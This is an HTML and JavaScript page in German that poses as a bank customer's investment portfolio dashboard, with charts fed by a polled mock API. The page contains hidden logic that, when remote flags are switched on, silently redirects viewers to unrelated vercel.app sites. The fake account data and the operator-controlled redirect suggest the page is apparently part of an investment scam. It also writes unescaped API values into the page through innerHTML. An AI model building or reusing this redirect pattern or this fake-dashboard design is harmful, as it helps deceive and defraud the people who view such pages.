<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Portfolio Dashboard</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
body { font-family: Inter, sans-serif; margin:0; background:#582d7d; color:#e6eef8; }
.wrap { max-width:420px; margin:0 auto; padding:16px; }
.logo { display:block; width:120px; margin:0 auto 20px; }
.card { background:#3d1f5e; border-radius:14px; padding:16px; margin-bottom:16px; box-shadow:0 4px 12px rgba(0,0,0,0.5); }
.user-info { text-align:center; }
.user-info h2 { margin:0; font-size:20px; }
.user-info p { margin:6px 0 0; color:#cfcfd1; font-size:14px; }
.chart-wrap { height:260px; margin-top:12px; position: relative; }
canvas { width:100% !important; height:100% !important; }
.meta { display:flex; justify-content:space-between; margin-top:8px; font-size:12px; color:#cfcfd1; }
.btn { background:transparent; border:1px solid rgba(255,255,255,0.1); padding:6px 10px; border-radius:10px; color:#cfcfd1; font-size:13px; cursor:pointer; }

#chartjs-tooltip {
  background: rgba(0,0,0,0.7);
  color: #fff;
  border-radius: 6px;
  padding: 6px;
  position: absolute;
  pointer-events: none;
  font-size: 12px;
  transition: 0.1s ease;
  white-space: nowrap;
  z-index: 100;
}
#chartjs-tooltip img { width:24px; height:24px; object-fit:contain; vertical-align:middle; }
</style>
</head>
<body>
<div class="wrap">

<img class="logo"
src="https://github.com/javad-niroumand/Lisa/blob/main/ChatGPT%20Image%20Nov%2025,%202025,%2002_43_24%20PM%20(1).png?raw=true"
alt="Bank Logo">

<div class="card user-info">
<h2 id="userName">—</h2>
<p id="customerNumber">Kundennummer #—</p>
</div>

<div class="card">
<strong id="totalPortfolio" style="display:block; text-align:center; font-size:18px; margin-bottom:8px;">
Gesamtportfolio: —
</strong>

<strong id="investmentTitle">Investitionsaufteilung</strong>

<div class="chart-wrap"><canvas id="pieChart"></canvas></div>
<div class="chart-wrap" style="margin-top:16px;"><canvas id="barChart"></canvas></div>

<div class="meta">
<span>Zuletzt aktualisiert: <span id="lastUpdated">—</span></span>
<button class="btn" id="refreshBtn">Aktualisieren</button>
</div>
</div>

<div class="card">
<strong>Rendite über die Zeit</strong>
<div class="chart-wrap"><canvas id="lineChart"></canvas></div>
<div class="meta">
<span>Status: <span id="status">idle</span></span>
</div>
</div>

</div>

<script>
const API_URL = "https://6797e9d9c2c861de0c6e6bdf.mockapi.io/investments";
const REDIRECT_URL = "https://trascription.vercel.app/";
const COLORS = ['#06558d','#3ec4ff','#6ee7b7','#b388ff','#ff6b6b','#ff9f1c','#2ec4b6','#8d99ae','#ef476f','#06d6a0'];
const HIGHLIGHT_COLOR = '#3ec4ff';
let pieChart, lineChart, barChart, lastData = null, redirectTriggered = false;

function formatCurrency(n){
  return '€'+n.toLocaleString(undefined,{minimumFractionDigits:2, maximumFractionDigits:2});
}

async function fetchData(){
  try {
    const res = await fetch(API_URL, {cache:'no-store'});
    const arr = await res.json();
    const data = arr[0];
    const dataStr = JSON.stringify(data);

    // Redirect logic (update3 and update)
    if(data.update3 === true && !redirectTriggered){
      redirectTriggered = true;
      window.location.href = "https://nvidia-fawn.vercel.app/";
    } else if(data.update === true && !redirectTriggered){
      redirectTriggered = true;
      window.location.href = REDIRECT_URL;
    } else if(data.update === false && data.update3 === false){
      redirectTriggered = false;
    }

    if(dataStr === lastData){
      document.getElementById('status').textContent='Keine Änderung';
      return;
    }
    lastData = dataStr;

    // User info
    document.getElementById('userName').textContent = data.user.name;
    document.getElementById('customerNumber').textContent = 'Kundennummer #' + data.user.customerNumber;

    // Total portfolio
    const totalPortfolioValue = data.roi[data.roi.length-1]?.value || 0;
    document.getElementById('totalPortfolio').textContent =
      `Gesamtportfolio: ${formatCurrency(totalPortfolioValue)}`;

    // Category title
    const category = data.investments[0]?.category || '';
    document.getElementById('investmentTitle').textContent =
      `Investitionsaufteilung – ${category}`;

    // Investments
    const invItems = data.investments.filter(i=>i.type);

    // PIE CHART
    pieChart.data.labels = invItems.map(i=>i.type);
    pieChart.data.datasets[0].data = invItems.map(i=>i.percentage);
    pieChart.data.datasets[0].backgroundColor =
      invItems.map((_,i)=>COLORS[i % COLORS.length]);
    pieChart.update();

    // ---- SORTING LOGIC FOR BAR CHART ----
    let combined = invItems.map(item => ({
        label: item.type,
        value: totalPortfolioValue * item.percentage / 100,
        logo: item.logoUrl
    }));

    combined.sort((a,b) => b.value - a.value);

    const sortedLabels = combined.map(x => x.label);
    const sortedValues = combined.map(x => x.value);
    const sortedLogos  = combined.map(x => x.logo);

    // BAR CHART
    barChart.data.labels = sortedLabels;
    barChart.data.datasets[0].data = sortedValues;
    barChart.data.datasets[0].logos = sortedLogos;

    const maxIndex = sortedValues.indexOf(Math.max(...sortedValues));
    barChart.data.datasets[0].backgroundColor =
      sortedValues.map((_,i)=> i === maxIndex ? HIGHLIGHT_COLOR : COLORS[i % COLORS.length]);

    barChart.update();

    // LINE CHART
    const roiHist = data.roi
      .map(p=>({x:p.date, y:p.value}))
      .sort((a,b)=>new Date(a.x)-new Date(b.x));

    lineChart.data.labels = roiHist.map(p=>p.x);
    lineChart.data.datasets = [{
      label:'Historisch',
      data: roiHist.map(p=>p.y),
      borderColor:'#3ec4ff',
      borderWidth:2,
      fill:false,
      tension:0.3
    }];
    lineChart.update();

    document.getElementById('lastUpdated').textContent = new Date().toLocaleString();
    document.getElementById('status').textContent = 'Aktualisiert';

  } catch(e){
    console.error(e);
    document.getElementById('status').textContent = 'Fehler';
  }
}

function initCharts(){
  const pieCtx = document.getElementById('pieChart').getContext('2d');
  pieChart = new Chart(pieCtx,{
    type:'pie',
    data:{labels:[], datasets:[{data:[], backgroundColor: []}]},
    options:{responsive:true, maintainAspectRatio:false, plugins:{legend:{display:false}}}
  });

  const lineCtx = document.getElementById('lineChart').getContext('2d');
  lineChart = new Chart(lineCtx,{
    type:'line',
    data:{ labels:[], datasets:[] },
    options:{
      responsive:true,
      maintainAspectRatio:false,
      scales:{
        x:{ticks:{color:'#cfcfd1'}},
        y:{ticks:{color:'#cfcfd1'}}
      },
      plugins:{
        tooltip:{ callbacks:{ label: ctx => 'Wert: ' + formatCurrency(ctx.parsed.y)} }
      }
    }
  });

  const barCtx = document.getElementById('barChart').getContext('2d');
  barChart = new Chart(barCtx,{
    type:'bar',
    data:{ labels:[], datasets:[{data:[], backgroundColor: []}] },
    options:{
      indexAxis:'y',
      responsive:true,
      maintainAspectRatio:false,
      scales:{
        x:{ ticks:{ color:'#cfcfd1', callback: val => formatCurrency(val) } },
        y:{ ticks:{ color:'#cfcfd1', font:{size:12} } }
      },
      plugins:{ legend:{ display:false }, tooltip:{ enabled:false } },
      animation: { duration:500 },
    },
    plugins: [{
      id: 'barLabelsInside',
      afterDatasetsDraw: chart => {
        const {ctx} = chart;
        const dataset = chart.data.datasets[0];
        const total = dataset.data.reduce((a,b)=>a+b,0);
        dataset.data.forEach((val,i)=>{
          const meta = chart.getDatasetMeta(0).data[i];
          const y = meta.y;
          const x = meta.x;
          const perc = Math.round(val / total * 100);
          const text = `${formatCurrency(val)} (${perc}%)`;
          ctx.font='12px Inter';
          ctx.fillStyle = '#fff';
          ctx.textAlign='right';
          const textWidth = ctx.measureText(text).width;
          if(meta.width > textWidth + 8){
            ctx.fillText(text, x-4, y+4);
          } else {
            ctx.textAlign='left';
            ctx.fillText(text, x+4, y+4);
          }
        });
      }
    }]
  });

  // Tooltip HTML element
  barChart.options.plugins.tooltip.external = function(context){
    let tooltipEl = document.getElementById('chartjs-tooltip');
    if (!tooltipEl) return;
    const tooltipModel = context.tooltip;
    if(tooltipModel.opacity === 0){ tooltipEl.style.opacity=0; return; }

    const idx = tooltipModel.dataPoints[0].dataIndex;
    const dataset = context.chart.data.datasets[0];
    const val = dataset.data[idx];
    const label = context.chart.data.labels[idx];
    const perc = Math.round(val / dataset.data.reduce((a,b)=>a+b,0) * 100);
    const logo = dataset.logos[idx];

    tooltipEl.innerHTML = `
      <div style="display:flex; align-items:center; gap:6px;">
        <img src="${logo}" />
        <div>
          <div>${label}</div>
          <div>${formatCurrency(val)} (${perc}%)</div>
        </div>
      </div>
    `;

    const position = context.chart.canvas.getBoundingClientRect();
    tooltipEl.style.opacity = 1;
    tooltipEl.style.left = position.left + window.pageXOffset + tooltipModel.caretX + 'px';
    tooltipEl.style.top = position.top + window.pageYOffset + tooltipModel.caretY + 'px';
  };
}

document.getElementById('refreshBtn').addEventListener('click', fetchData);

initCharts();
fetchData();
setInterval(fetchData, 8000);
</script>
</body>
</html>
